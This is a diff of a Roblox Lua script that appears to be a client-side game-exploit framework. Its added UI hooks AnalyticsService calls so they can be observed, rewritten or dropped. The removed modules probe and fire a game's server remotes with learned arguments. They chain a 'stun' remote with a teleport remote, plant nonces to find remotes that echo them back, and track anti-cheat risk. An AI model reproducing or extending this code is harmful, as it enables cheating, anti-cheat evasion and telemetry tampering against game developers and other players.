+C.ASE_CARD    = Color3.fromRGB(252,244,228)
+C.ASE_SOURCE  = Color3.fromRGB(210,240,215)   -- green for gains
+C.ASE_SINK    = Color3.fromRGB(248,220,215)   -- red for spends
+C.ASE_PASS    = Color3.fromRGB(230,245,230)
+C.ASE_MOD     = Color3.fromRGB(225,235,250)
+C.ASE_SUP     = Color3.fromRGB(250,225,225)
+C.ASE_LOG     = Color3.fromRGB(30,28,24)      -- dark log bg
+
+-- ============================================================
+-- UI — SECTION: Hook Mode Control
+-- ============================================================
+local _, sASEMode = makeSection(pageGSE, "📊  AnalyticsService — Hook Control")
+
+gseLabel(sASEMode,
+    "Intercepts all AnalyticsService Fire* calls. Choose how to handle them:\n" ..
+    "Passthrough = observe only.  Modify = rewrite fields.  Suppress All = drop everything.",
+    11, false, C.SUBTEXT)
+
+-- Hook status indicator
+local hookStatusRow = gseRow(sASEMode)
+local hookStatusDot = mk("Frame",{
+    BackgroundColor3 = ASE.HookInstalled
+        and Color3.fromRGB(80,200,100)
+        or  Color3.fromRGB(200,80,80),
+    BorderSizePixel=0,
+    Size=UDim2.new(0,10,0,10),
+    Parent=hookStatusRow,
+})
+addCorner(hookStatusDot, UDim.new(1,0))
+local hookStatusLabel = gseLabel(hookStatusRow,
+    ASE.HookInstalled and "Hook active" or "Hook not installed",
+    11, true,
+    ASE.HookInstalled
+        and Color3.fromRGB(60,160,80)
+        or  Color3.fromRGB(180,60,60))
+
+local btnReinstall = gseBtn(hookStatusRow, "↻ Reinstall Hook", C.BTN, C.BTNHOV, 3)
+btnReinstall.MouseButton1Click:Connect(function()
+    ASE.HookInstalled = false
+    ASE_InstallHook()
+    tween(hookStatusDot, TweenInfo.new(0.15), {
+        BackgroundColor3 = ASE.HookInstalled
+            and Color3.fromRGB(80,200,100)
+            or  Color3.fromRGB(200,80,80)
     })
-
-    task.spawn(function()
-        for _, nudge in ipairs(SN_SEQUENCE) do
-            -- Check if already resolved by another path
-            if ASE.Panel.HeartbeatAlive or
-               (ASE_BedrockPairs[remoteName] and
-                ASE_BedrockPairs[remoteName].confidence >= 0.90) then
-                print(string.format("[SN] Already resolved before %s nudge — stopping.",
-                    nudge.name))
-                return
-            end
-
-            local ok, resolved = pcall(nudge.fn, remoteName)
-            if ok and resolved then
-                print(string.format(
-                    "[SN] RESOLVED: %s unblocked by nudge %s",
-                    remoteName, nudge.name))
-
-                -- Lock as Bedrock with STATE_NUDGE origin
-                ASE_BedrockPairs[remoteName] = {
-                    sinkRemote     = remoteName,
-                    feedbackRemote = nil,
-                    nonce          = nil,
-                    confirmedAt    = os.clock(),
-                    cargo          = {},
-                    confidence     = 0.85,
-                    origin         = "STATE_NUDGE",
-                    nudgeKey       = nudge.name,
-                }
-                ASE.Panel.Visible        = true
-                ASE.Panel.ActiveSink     = remoteName
-                ASE.Panel.ActiveFeedback = nil
-                ASE.Panel.BedrockConf    = 0.85
-                ASE.Panel.HeartbeatAlive = true
-
-                local CSK = _G.PC.CSK
-                if CSK then
-                    CSK.Annotate(remoteName, string.format(
-                        "BEDROCK via STATE_NUDGE: key=%s", nudge.name))
-                end
-
-                ASE_AppendTx({
-                    directive  = "STATE-NUDGE RESOLVED",
-                    rawPayload = { nudge = nudge.name },
-                    result     = string.format("BEDROCK [STATE_NUDGE:%s]", nudge.name),
-                })
-
-                ASE_LingerWatch.Stop(remoteName)
-                if onResolved then onResolved(nudge.name) end
-                return
-            elseif not ok then
-                print(string.format("[SN] Nudge %s errored: %s",
-                    nudge.name, tostring(resolved)))
-            end
-        end
-
-        -- All nudges exhausted
-        print(string.format(
-            "[SN] All nudges exhausted on %s — escalating to Two-Stage Sequence.",
-            remoteName))
-        ASE_AppendTx({
-            directive  = string.format("STATE-NUDGE EXHAUSTED: %s", remoteName),
-            rawPayload = {},
-            result     = "Pivoting to CDG antecedent extraction.",
-        })
-        -- Final escalation: CDG antecedent query + two-stage firing sequence
-        ASE_TwoStageSequencer.Run(remoteName)
-    end)
-end
-
--- ══════════════════════════════════════════════════════════════════════════════
--- MODULE 2.7 — CDG ANTECEDENT EXTRACTOR + TWO-STAGE SEQUENCER
--- ══════════════════════════════════════════════════════════════════════════════
--- CDG Antecedent Extractor:
---   Queries CDG for all edges where ToID == targetRemote (inbound edges).
---   Ranks candidates by a composite score:
---     score = (Confidence * EffectSize) * 0.60
---           + JaccardArgSim              * 0.25
---           + FireCountNorm              * 0.15
---   Jaccard arg similarity: fraction of RSM ArgSig slots where DominantType
---   and SuccessString/Value sets overlap between candidate and target.
---
--- Two-Stage Sequencer:
---   Stage 1 — fires the top antecedent via SARP ("The Key")
---   Stun watch — LingerWatch polls for WalkSpeed=0 / JumpPower=0
---   Stage 2 — fires the target remote via SARP ("The Lock")
---   Resolution — if CFrame delta occurs after Stage 2, Bedrock confirmed
---               with origin = "TWO_STAGE_SEQUENCE"
--- ══════════════════════════════════════════════════════════════════════════════
-
--- ASE_AntecedentExtractor and ASE_TwoStageSequencer already declared above
-
--- ── CDG Antecedent Extractor ─────────────────────────────────────────────────
-
--- Compute Jaccard arg similarity between two remotes via RSM ArgSig
-local function ASE_JaccardArgSim(nameA, nameB)
-    local RSM  = _G.PC and _G.PC.RSM
-    if not RSM then return 0.0 end
-    local recA = RSM.Get(nameA)
-    local recB = RSM.Get(nameB)
-    if not recA or not recB then return 0.0 end
-    local sigA = recA.ArgSig or {}
-    local sigB = recB.ArgSig or {}
-    if #sigA == 0 or #sigB == 0 then return 0.0 end
-
-    local slots  = math.max(#sigA, #sigB)
-    local matchScore = 0.0
-
-    for i = 1, slots do
-        local sA = sigA[i]
-        local sB = sigB[i]
-        if sA and sB then
-            -- Type match
-            if sA.DominantType == sB.DominantType then
-                matchScore = matchScore + 0.5
-                -- String set overlap
-                if sA.DominantType == "string" then
-                    local setA, setB = {}, {}
-                    for _, s in ipairs(sA.SuccessStrings or {}) do setA[s] = true end
-                    local inter, union = 0, 0
-                    for _, s in ipairs(sB.SuccessStrings or {}) do
-                        union = union + 1
-                        if setA[s] then inter = inter + 1 end
-                    end
-                    for _ in pairs(setA) do union = union + 1 end
-                    if union > 0 then
-                        matchScore = matchScore + 0.5 * (inter / union)
-                    end
-                -- Number range overlap
-                elseif sA.DominantType == "number" then
-                    local loA = sA.NumberMin or sA.NumberMean or 0
-                    local hiA = sA.NumberMax or sA.NumberMean or 0
-                    local loB = sB.NumberMin or sB.NumberMean or 0
-                    local hiB = sB.NumberMax or sB.NumberMean or 0
-                    local inter = math.max(0, math.min(hiA, hiB) - math.max(loA, loB))
-                    local union = math.max(hiA, hiB) - math.min(loA, loB)
-                    if union > 0 then
-                        matchScore = matchScore + 0.5 * (inter / union)
-                    end
-                else
-                    matchScore = matchScore + 0.5
-                end
-            end
-        end
-    end
-
-    return math.clamp(matchScore / slots, 0.0, 1.0)
-end
-
--- Extract and rank antecedent candidates for a target remote
-function ASE_AntecedentExtractor.Query(targetRemote, minConf)
-    minConf = minConf or 0.15
-    local CDG = _G.PC and _G.PC.CDG
-    local PR  = _G.PC and _G.PC.PR_Registry
-    if not CDG then return {} end
-
-    -- Get all strong edges — filter for inbound (ToID == target)
-    local allEdges = CDG.GetStrongEdges(minConf)
-    local inbound  = {}
-    for _, edge in ipairs(allEdges) do
-        if edge.ToID == targetRemote then
-            table.insert(inbound, edge)
-        end
-    end
-
-    if #inbound == 0 then
-        -- CDG has no inbound edges yet — fall back to PR FireCount ranking
-        -- Any remote that fires frequently enough to appear in PR is a candidate
-        local candidates = {}
-        if PR then
-            for name, rec in pairs(PR) do
-                if name ~= targetRemote and rec.FireCount and rec.FireCount > 2 then
-                    table.insert(candidates, {
-                        name        = name,
-                        score       = 0.0,
-                        confidence  = 0.0,
-                        effectSize  = 0.0,
-                        jaccardSim  = ASE_JaccardArgSim(name, targetRemote),
-                        fireCount   = rec.FireCount,
-                        remoteType  = rec.RemoteType or "RemoteEvent",
-                        source      = "PR_FALLBACK",
-                    })
-                end
-            end
-            -- Sort by Jaccard alone when no CDG data
-            table.sort(candidates, function(a, b)
-                return (a.jaccardSim + a.fireCount * 0.001) >
-                       (b.jaccardSim + b.fireCount * 0.001)
-            end)
-        end
-        return candidates
-    end
-
-    -- Normalize FireCount across PR for scoring
-    local maxFires = 1
-    if PR then
-        for _, rec in pairs(PR) do
-            if rec.FireCount and rec.FireCount > maxFires then
-                maxFires = rec.FireCount
-            end
-        end
-    end
-
-    local candidates = {}
-    for _, edge in ipairs(inbound) do
-        local name      = edge.FromID
-        local prRec     = PR and PR[name]
-        local fireNorm  = prRec and (prRec.FireCount / maxFires) or 0.0
-        local jaccard   = ASE_JaccardArgSim(name, targetRemote)
-
-        -- Composite score
-        local score = (edge.Confidence * (edge.EffectSize or 1.0)) * 0.60
-                    + jaccard                                        * 0.25
-                    + fireNorm                                       * 0.15
-
-        table.insert(candidates, {
-            name        = name,
-            score       = score,
-            confidence  = edge.Confidence,
-            effectSize  = edge.EffectSize or 0.0,
-            coSuccess   = edge.CoSuccess  or 0,
-            coFired     = edge.CoFired    or 0,
-            jaccardSim  = jaccard,
-            fireCount   = prRec and prRec.FireCount or 0,
-            remoteType  = prRec and prRec.RemoteType or "RemoteEvent",
-            source      = "CDG",
-        })
-    end
-
-    table.sort(candidates, function(a, b) return a.score > b.score end)
-    return candidates
-end
-
--- ── Two-Stage Sequencer ───────────────────────────────────────────────────────
-
--- Capture live physics state — used as pre-fire baseline to detect genuine
--- drops to zero rather than leftover state from prior steering/nudge phases.
-local function TSS_PhysicsBaseline()
-    local Players = game:GetService("Players")
-    local lp   = Players and Players.LocalPlayer
-    local char = lp and lp.Character
-    local hum  = char and char:FindFirstChildOfClass("Humanoid")
-    return {
-        walkSpeed = hum and hum.WalkSpeed or 16,
-        jumpPower = hum and hum.JumpPower or 50,
-    }
-end
-
--- Stun watch: compares live Humanoid values against pre-fire baseline.
--- Only returns true when values DROPPED from a non-zero baseline to zero —
--- confirming the server stunned the character AFTER Stage 1 fired.
-local function TSS_WaitForStun(timeout, baseline)
-    local Players = game:GetService("Players")
-    local lp = Players and Players.LocalPlayer
-    local t0 = os.clock()
-    while (os.clock() - t0) < timeout do
-        task.wait(0.05)
-        local char = lp and lp.Character
-        local hum  = char and char:FindFirstChildOfClass("Humanoid")
-        if hum then
-            if hum.WalkSpeed == 0 and (baseline.walkSpeed or 0) > 0 then
-                return true, string.format("WalkSpeed 0 (was %.0f)", baseline.walkSpeed)
-            end
-            if hum.JumpPower == 0 and (baseline.jumpPower or 0) > 0 then
-                return true, string.format("JumpPower 0 (was %.0f)", baseline.jumpPower)
-            end
-        end
-    end
-    return false, nil
-end
-
--- Watch LingerWatch snapshots for teleport completion (CFrame delta)
-local function TSS_WaitForTeleport(remoteName, timeout)
-    local t0    = os.clock()
-    local LW    = ASE_LW_Sessions[remoteName]
-    local baseX = LW and LW.baseline["CHAR:HRP.X"] or nil
-    local baseZ = LW and LW.baseline["CHAR:HRP.Z"] or nil
-
-    while (os.clock() - t0) < timeout do
-        task.wait(0.10)
-        local snap = LW_Snapshot()
-        local dx = math.abs((snap["CHAR:HRP.X"] or 0) - (baseX or 0))
-        local dz = math.abs((snap["CHAR:HRP.Z"] or 0) - (baseZ or 0))
-        -- Teleport threshold: moved > 5 studs from baseline
-        if dx > 5 or dz > 5 then
-            return true, string.format("CFrame delta: dX=%.1f dZ=%.1f", dx, dz)
-        end
-        -- Also accept HeartbeatAlive or BedrockPair as confirmation
-        if ASE.Panel.HeartbeatAlive then return true, "HeartbeatAlive" end
-    end
-    return false, nil
-end
-
--- Main two-stage sequence execution
-function ASE_TwoStageSequencer.Run(targetRemote, onResolved)
-    local SARP = _G.PC and _G.PC.SARP
-    local RSM  = _G.PC and _G.PC.RSM
-    local PR   = _G.PC and _G.PC.PR_Registry
-    if not SARP or not PR then
-        print("[TSS] SARP or PR unavailable — aborting.")
-        return
-    end
-
-    -- Query antecedent candidates
-    local candidates = ASE_AntecedentExtractor.Query(targetRemote, 0.15)
-
-    if #candidates == 0 then
-        print(string.format("[TSS] No antecedent candidates for %s — CDG insufficient.",
-            targetRemote))
-        ASE_AppendTx({
-            directive  = string.format("TWO-STAGE: %s", targetRemote),
-            rawPayload = {},
-            result     = "No CDG antecedents found — sequence aborted.",
-        })
-        return
-    end
-
-    -- Log top candidates
-    print(string.format("[TSS] Antecedent candidates for %s:", targetRemote))
-    for i, c in ipairs(candidates) do
-        if i > 5 then break end
-        print(string.format("  [%d] %s  score=%.3f  conf=%.2f  jaccard=%.2f  src=%s",
-            i, c.name, c.score, c.confidence, c.jaccardSim, c.source))
-    end
-
-    -- Prioritise CDG-sourced and Jaccard-nonzero candidates; PR_FALLBACK
-    -- zero-score entries go last. Cap at 4 attempts to avoid flooding.
-    local ordered = {}
-    for _, c in ipairs(candidates) do
-        if c.source == "CDG" or c.jaccardSim > 0 then
-            table.insert(ordered, 1, c)
-        else
-            table.insert(ordered, c)
-        end
-    end
-    local maxAttempts = math.min(4, #ordered)
-
-    ASE_AppendTx({
-        directive  = string.format("TWO-STAGE: -> %s", targetRemote),
-        rawPayload = { candidates = maxAttempts },
-        result     = string.format("Cycling %d antecedent candidate(s)", maxAttempts),
-    })
-
-    task.spawn(function()
-        ASE_LingerWatch.Start(targetRemote)
-        local sequenceResolved = false
-
-        for attemptIdx = 1, maxAttempts do
-            if sequenceResolved then break end
-            if ASE.Panel.HeartbeatAlive or
-               (ASE_BedrockPairs[targetRemote] and
-                ASE_BedrockPairs[targetRemote].confidence >= 0.90) then
-                break
-            end
-
-            local top = ordered[attemptIdx]
-            print(string.format("[TSS] Attempt %d/%d — Stage 1: %s (score=%.3f jaccard=%.2f src=%s)",
-                attemptIdx, maxAttempts, top.name, top.score, top.jaccardSim, top.source))
-
-            -- Build Stage 1 args from RSM
-            local rsmRec1 = RSM and RSM.Get(top.name)
-            local args1   = {}
-            if rsmRec1 and rsmRec1.ArgSig then
-                for i, sig in ipairs(rsmRec1.ArgSig) do
-                    if sig.DominantType == "number" and #(sig.SuccessValues or {}) > 0 then
-                        args1[i] = sig.SuccessValues[1]
-                    elseif sig.DominantType == "string" and #(sig.SuccessStrings or {}) > 0 then
-                        args1[i] = sig.SuccessStrings[1]
-                    elseif sig.DominantType == "boolean" then
-                        args1[i] = true
-                    end
-                end
-            end
-
-            -- Fresh physics baseline BEFORE Stage 1 fires — prevents false
-            -- stun detection from leftover zeroes of prior steering/nudge phases
-            local baseline = TSS_PhysicsBaseline()
-            print(string.format("[TSS] Pre-fire baseline: WalkSpeed=%.0f JumpPower=%.0f",
-                baseline.walkSpeed, baseline.jumpPower))
-
-            -- Skip this candidate if character is already stunned — the stun
-            -- watch would immediately return true before Stage 1 even fires
-            if baseline.walkSpeed == 0 or baseline.jumpPower == 0 then
-                print(string.format("[TSS] Skipping %s — character already stunned. Waiting 2s.",
-                    top.name))
-                task.wait(2.0)
-                baseline = TSS_PhysicsBaseline()
-                if baseline.walkSpeed == 0 and baseline.jumpPower == 0 then
-                    print("[TSS] Stun persists after 2s — aborting sequence.")
-                    break
-                end
-            end
-
-            -- Fire Stage 1
-            print(string.format("[TSS] Firing Stage 1: %s", top.name))
-            local w1, s1, e1 = SARP.Build("Attribute", args1, nil, nil, top.name)
-            if w1 then
-                SARP.Execute(w1, s1, top.name, function(ok, result, err)
-                    print(string.format("[TSS] Stage 1 result: %s", ok and "OK" or tostring(err)))
-                end)
-            else
-                print(string.format("[TSS] Stage 1 SARP.Build failed: %s", tostring(e1)))
-            end
-
-            -- Stun watch — compares against the baseline taken above
-            local stunned, stunKey = TSS_WaitForStun(3.0, baseline)
-            if stunned then
-                print(string.format("[TSS] Stun detected (%s) — firing Stage 2.", stunKey))
-            else
-                print(string.format("[TSS] No stun after Stage 1 (%s) — firing Stage 2 anyway.", top.name))
-            end
-
-            -- Build and fire Stage 2
-            local rsmRec2 = RSM and RSM.Get(targetRemote)
-            local args2   = {}
-            if rsmRec2 and rsmRec2.ArgSig then
-                for i, sig in ipairs(rsmRec2.ArgSig) do
-                    if sig.DominantType == "number" and #(sig.SuccessValues or {}) > 0 then
-                        args2[i] = sig.SuccessValues[1]
-                    elseif sig.DominantType == "string" and #(sig.SuccessStrings or {}) > 0 then
-                        args2[i] = sig.SuccessStrings[1]
-                    elseif sig.DominantType == "boolean" then
-                        args2[i] = true
-                    end
-                end
-            end
-
-            print(string.format("[TSS] Firing Stage 2: %s", targetRemote))
-            local w2, s2, e2 = SARP.Build("Attribute", args2, nil, nil, targetRemote)
-            if w2 then
-                SARP.Execute(w2, s2, targetRemote, function(ok, result, err)
-                    print(string.format("[TSS] Stage 2 result: %s err=%s",
-                        ok and "OK" or "FAIL", tostring(err)))
-                end)
-            else
-                print(string.format("[TSS] Stage 2 SARP.Build failed: %s", tostring(e2)))
-            end
-
-            -- Resolution watch: CFrame delta > 5 studs = teleport executed
-            local teleported, teleKey = TSS_WaitForTeleport(targetRemote, 4.0)
-            if teleported then
-                sequenceResolved = true
-                print(string.format("[TSS] TWO-STAGE COMPLETE: %s via %s — %s",
-                    targetRemote, top.name, teleKey))
-
-                ASE_BedrockPairs[targetRemote] = {
-                    sinkRemote     = targetRemote,
-                    feedbackRemote = top.name,
-                    nonce          = nil,
-                    confirmedAt    = os.clock(),
-                    cargo          = {},
-                    confidence     = 0.95,
-                    origin         = "TWO_STAGE_SEQUENCE",
-                    antecedent     = top.name,
-                    resolvedBy     = teleKey,
-                }
-                ASE.Panel.Visible        = true
-                ASE.Panel.ActiveSink     = targetRemote
-                ASE.Panel.ActiveFeedback = top.name
-                ASE.Panel.BedrockConf    = 0.95
-                ASE.Panel.HeartbeatAlive = true
-
-                local CSK = _G.PC.CSK
-                if CSK then
-                    CSK.Annotate(targetRemote, string.format(
-                        "BEDROCK via TWO_STAGE: key=%s lock=%s", top.name, targetRemote))
-                end
-                ASE_AppendTx({
-                    directive  = "TWO-STAGE COMPLETE",
-                    rawPayload = { antecedent=top.name, resolvedBy=teleKey },
-                    result     = string.format("BEDROCK [TWO_STAGE:%s]", top.name),
-                })
-                ASE_LingerWatch.Stop(targetRemote)
-                if onResolved then onResolved(top.name, teleKey) end
-            else
-                print(string.format("[TSS] Attempt %d/%d no resolution — next candidate.",
-                    attemptIdx, maxAttempts))
-                task.wait(1.5)
-            end
-        end
-
-        if not sequenceResolved then
-            print(string.format("[TSS] All %d candidate(s) exhausted on %s.",
-                maxAttempts, targetRemote))
-            ASE_AppendTx({
-                directive  = string.format("TWO-STAGE EXHAUSTED: %s", targetRemote),
-                rawPayload = {},
-                result     = "CDG needs passive observation — run CDG Primer.",
-            })
-            ASE_LingerWatch.Stop(targetRemote)
-        end
-    end)
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 2 — BEDROCK HANDSHAKE
--- A→Server→B topological verification
--- ═════════════════════════════════════════════════════════════
-ASE_BedrockHandshake = {}
-
--- Open a global nonce listener across all indexed S2C remotes
-local function ASE_OpenNonceListener(nonce, onCapture)
-    local PR    = _G.PC.PR_Registry
-    local conns = {}
-    local done  = false
-
-    if not PR then return nil end
-
-    for name, rec in pairs(PR) do
-        if rec.Remote and rec.RemoteType == "RemoteEvent" and
-           (rec.Direction == "S2C" or rec.Direction == "BOTH") then
-            local rname = name
-            local ok, conn = pcall(function()
-                return rec.Remote.OnClientEvent:Connect(function(...)
-                    if done then return end
-                    local args = {...}
-                    -- Search all args recursively for nonce
-                    local function findNonce(v, depth)
-                        if depth > 5 then return false end
-                        if type(v) == "string" and v:find(nonce, 1, true) then
-                            return true
-                        end
-                        if type(v) == "table" then
-                            for _, child in pairs(v) do
-                                if findNonce(child, depth+1) then return true end
-                            end
-                        end
-                        return false
-                    end
-                    if findNonce(args, 0) then
-                        done = true
-                        onCapture(rname, args)
-                    end
-                end)
-            end)
-            if ok and conn then table.insert(conns, conn) end
-        end
-    end
-
-    ASE_NonceListeners[nonce] = {
-        conns   = conns,
-        done    = false,
-        cleanup = function()
-            for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
-            ASE_NonceListeners[nonce] = nil
-        end
-    }
-    return ASE_NonceListeners[nonce]
-end
-
-function ASE_BedrockHandshake.Run(goal)
-    local sinkRemote = goal.params.sinkRemote
-    local PR         = _G.PC.PR_Registry
-    local SARP       = _G.PC.SARP
-    local SBI        = _G.PC.SBI
-
-    if not sinkRemote then
-        error("Sink remote not specified for BEDROCK goal")
-    end
-
-    -- PR_Registry may not yet contain remotes discovered only via APE/SBI probing.
-    -- Fall back to RSM or APE campaign data before hard-failing.
-    if not PR or not PR[sinkRemote] then
-        local RSM = _G.PC.RSM
-        local APE = _G.PC.APE
-        local knownViaRSM = RSM and RSM.Get(sinkRemote) ~= nil
-        local knownViaAPE = false
-        if APE then
-            for _, c in ipairs(APE.GetCampaigns() or {}) do
-                if c.remoteName == sinkRemote then knownViaAPE = true; break end
-            end
-        end
-        if not knownViaRSM and not knownViaAPE then
-            error("Sink remote not found in PR/RSM/APE: " .. tostring(sinkRemote))
-        end
-        -- Known via RSM or APE — proceed with caution, no PR data available
-        warn(string.format(
-            "[ASE Bedrock] %s not in PR_Registry — proceeding from %s data only.",
-            sinkRemote, knownViaRSM and "RSM" or "APE"))
-    end
-
-    local sbiRec = SBI and SBI.Get(sinkRemote)
-    if sbiRec and sbiRec.ACPattern == "CORRECTS_FAST" then
-        warn("[ASE Bedrock] High AC risk on " .. sinkRemote .. " — proceeding with caution.")
-    end
-
-    -- Generate nonce + build envelope
-    local nonce   = ASE_GenNonce()
-    local envelope = {
-        __nonce    = nonce,
-        __callback = "report",   -- hint: server should echo this back
-        __cargo    = goal.params.cargo or {},
-    }
-
-    -- Merge with any known-good args from SBI/RSM
-    local rsmRec = _G.PC.RSM and _G.PC.RSM.Get(sinkRemote)
-    local baseArgs = {}
-    if rsmRec then
-        for i, argSig in ipairs(rsmRec.ArgSig or {}) do
-            if argSig.DominantType == "table" then
-                baseArgs[i] = envelope
-            elseif argSig.DominantType == "number" and #argSig.SuccessValues > 0 then
-                baseArgs[i] = argSig.SuccessValues[1]
-            elseif argSig.DominantType == "string" and #argSig.SuccessStrings > 0 then
-                baseArgs[i] = argSig.SuccessStrings[1]
-            else
-                baseArgs[i] = envelope
-            end
-        end
-    end
-    if #baseArgs == 0 then baseArgs = {envelope} end
-
-    -- Pre-prediction
-    local prediction = sbiRec and SBI.PredictOutcome(sinkRemote, baseArgs) or nil
-    goal.result = { nonce=nonce, prediction=prediction }
-
-    -- Open nonce listener BEFORE firing
-    local captured     = false
-    local feedbackRemote = nil
-    local feedbackArgs   = nil
-
-    local listener = ASE_OpenNonceListener(nonce, function(rname, args)
-        captured       = true
-        feedbackRemote = rname
-        feedbackArgs   = args
-    end)
-
-    ASE_AppendTx({
-        directive  = string.format("BEDROCK PROBE → %s", sinkRemote),
-        rawPayload = envelope,
-        nonce      = nonce,
-        result     = "FIRING",
-    })
-
-    -- Fire via SARP
-    local channel = "Attribute"
-    local prRec   = PR[sinkRemote]
-
-    local wrapped, simResult, buildErr = SARP and SARP.Build(channel, baseArgs, nil, nil, sinkRemote)
-    if not wrapped then
-        if listener then listener.cleanup() end
-        error("SARP.Build failed: " .. tostring(buildErr))
-    end
-
-    local fired = false
-    SARP.Execute(wrapped, simResult, sinkRemote, function(success, result, err)
-        fired = true
-        goal.result.sarpSuccess = success
-        goal.result.sarpResult  = result
-    end)
-
-    -- Wait for nonce capture or timeout
-    local t0 = os.clock()
-    while not captured and (os.clock() - t0) < ASE_CFG.NonceListenTimeout do
-        task.wait(0.1)
-        if goal.status == ASE.STATUS.ABORTED then
-            if listener then listener.cleanup() end
-            return
-        end
-    end
-
-    if listener then listener.cleanup() end
-
-    if captured then
-        -- Topological confirmation: A→B lock
-        ASE_BedrockPairs[sinkRemote] = {
-            sinkRemote     = sinkRemote,
-            feedbackRemote = feedbackRemote,
-            nonce          = nonce,
-            confirmedAt    = os.clock(),
-            cargo          = goal.params.cargo or {},
-            confidence     = 1.0,
-        }
-
-        -- Lock as TSR binding
-        local TSR = _G.PC.TSR
-        if TSR and TSR.Binder then
-            pcall(function()
-                TSR.Binder.BindIntent("__BEDROCK_" .. sinkRemote)
-            end)
-        end
-
-        -- Show execution panel
-        ASE.Panel.Visible        = true
-        ASE.Panel.ActiveSink     = sinkRemote
-        ASE.Panel.ActiveFeedback = feedbackRemote
-        ASE.Panel.BedrockConf    = 1.0
-        ASE.Panel.HeartbeatAlive = true
-
-        -- Annotate in CSK
-        local CSK = _G.PC.CSK
-        if CSK then
-            CSK.Annotate(sinkRemote, string.format(
-                "BEDROCK CONFIRMED → %s (nonce=%s)", feedbackRemote, nonce:sub(1,8)))
-        end
-
-        goal.result.confirmed      = true
-        goal.result.feedbackRemote = feedbackRemote
-        print(string.format("[ASE] ✓ BEDROCK confirmed: %s → %s", sinkRemote, feedbackRemote))
-
-        ASE_AppendTx({
-            directive  = "BEDROCK CONFIRMED",
-            rawPayload = {sinkRemote=sinkRemote, feedbackRemote=feedbackRemote},
-            nonce      = nonce,
-            result     = "✓ PIPELINE ESTABLISHED",
-        })
-
-        -- Start heartbeat
-        ASE_BedrockHandshake.StartHeartbeat(sinkRemote)
-    else
-        goal.result.confirmed = false
-        ASE_AppendTx({
-            directive  = string.format("BEDROCK PROBE → %s", sinkRemote),
-            rawPayload = envelope,
-            nonce      = nonce,
-            result     = "✗ NO RETURN — not a proxy",
-        })
-    end
-end
-
--- Heartbeat: re-verify the A→B link periodically
-function ASE_BedrockHandshake.StartHeartbeat(sinkRemote)
-    task.spawn(function()
-        while ASE.Panel.HeartbeatAlive and ASE.Panel.ActiveSink == sinkRemote do
-            task.wait(ASE_CFG.HeartbeatInterval)
-            local pair = ASE_BedrockPairs[sinkRemote]
-            if not pair then break end
-
-            local PR   = _G.PC.PR_Registry
-            local SARP = _G.PC.SARP
-            local alive = false
-
-            -- ── Re-verify strategy depends on how the circuit was established ──
-            -- GHOST_HANDSHAKE / TWO_STAGE circuits are challenge-response via an RF
-            -- antecedent. Re-verify by invoking that RF and checking for non-nil return.
-            -- Classic nonce-echo circuits re-verify via the original nonce path.
-            local origin = pair.origin or ""
-            local isRFCircuit = (origin == "LINGER_GHOST_HANDSHAKE"
-                              or origin == "TWO_STAGE_SEQUENCE")
-            local antecedent  = pair.feedbackRemote  -- the RF that challenged us
-
-            if isRFCircuit and antecedent and PR and PR[antecedent] then
-                -- RF heartbeat: invoke the antecedent RF — any non-nil return = alive
-                local antRec = PR[antecedent]
-                if antRec and antRec.Remote and antRec.RemoteType == "RemoteFunction" then
-                    local RSM = _G.PC.RSM
-                    local rsmRec = RSM and RSM.Get(antecedent)
-                    local hbArgs = {}
-                    if rsmRec and rsmRec.ArgSig then
-                        for i, sig in ipairs(rsmRec.ArgSig) do
-                            if sig.DominantType == "number" and #(sig.SuccessValues or {}) > 0 then
-                                hbArgs[i] = sig.SuccessValues[1]
-                            elseif sig.DominantType == "string" and #(sig.SuccessStrings or {}) > 0 then
-                                hbArgs[i] = sig.SuccessStrings[1]
-                            elseif sig.DominantType == "boolean" then
-                                hbArgs[i] = true
-                            end
-                        end
-                    end
-
-                    local ok, returnVal = pcall(function()
-                        return antRec.Remote:InvokeServer(table.unpack(hbArgs))
-                    end)
-                    -- Alive if invocation didn't error and returned something
-                    alive = ok and returnVal ~= nil
-                end
-
-            elseif PR and PR[sinkRemote] and SARP then
-                -- Classic nonce-echo heartbeat
-                local testNonce = ASE_GenNonce()
-                local listener  = ASE_OpenNonceListener(testNonce, function()
-                    alive = true
-                end)
-                local testEnv   = { __nonce=testNonce, __callback="heartbeat" }
-                local wrapped, sim = SARP.Build("Attribute", {testEnv}, nil, nil, sinkRemote)
-                if wrapped then
-                    SARP.Execute(wrapped, sim, sinkRemote, function() end)
-                end
-                local t0 = os.clock()
-                while not alive and (os.clock()-t0) < 3.0 do task.wait(0.15) end
-                if listener then listener.cleanup() end
-            end
-
-            if not alive then
-                ASE.Panel.HeartbeatAlive = false
-                ASE.Panel.BedrockConf    = 0.0
-                pair.confidence          = 0.0
-                warn(string.format("[ASE] ⚠ BEDROCK HEARTBEAT LOST: %s", sinkRemote))
-                ASE_AppendTx({
-                    directive  = "HEARTBEAT LOST",
-                    rawPayload = { sinkRemote=sinkRemote, origin=origin },
-                    result     = "✗ PIPELINE BROKEN — entering RECOMPILE",
-                })
-                if ASE_Mode == ASE.MODE.MASTERY then
-                    ASE_GoalEngine.Push(ASE.GOAL.RECOMPILE, {
-                        sinkRemote     = sinkRemote,
-                        feedbackRemote = pair.feedbackRemote,
-                    })
-                end
-                break
-            else
-                ASE.Panel.BedrockConf = pair.confidence
-                print(string.format("[ASE] ♥ Heartbeat alive: %s (via %s)",
-                    sinkRemote, isRFCircuit and antecedent or "nonce-echo"))
-            end
-        end
-    end)
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 3 — DIRECTIVE COMPILER
--- Static cargo: intent → data envelope, lift raw → TSR Intent
--- ═════════════════════════════════════════════════════════════
-ASE_DirectiveCompiler = {}
-
--- Compile a named TSR intent into a raw data envelope
--- using the sink remote's known arg schema
-function ASE_DirectiveCompiler.Compile(intentName, args, sinkRemote)
-    local TSR    = _G.PC.TSR
-    local RSM    = _G.PC.RSM
-    local PR     = _G.PC.PR_Registry
-
-    -- Check if TSR has a binding for this intent
-    if TSR and TSR.Runtime and TSR.Runtime.IsReady(intentName) then
-        -- Route through TSR directly
-        local result = TSR.Runtime.Execute(intentName, args)
-        return true, result, nil
-    end
-
-    -- Fall back to direct envelope construction via known arg schema
-    local rsmRec = RSM and RSM.Get(sinkRemote)
-    if not rsmRec then
-        return false, nil, "No RSM record for " .. tostring(sinkRemote)
-    end
-
-    -- Check if we have a finalized directive for this intent
-    local directive = ASE_Directives[intentName]
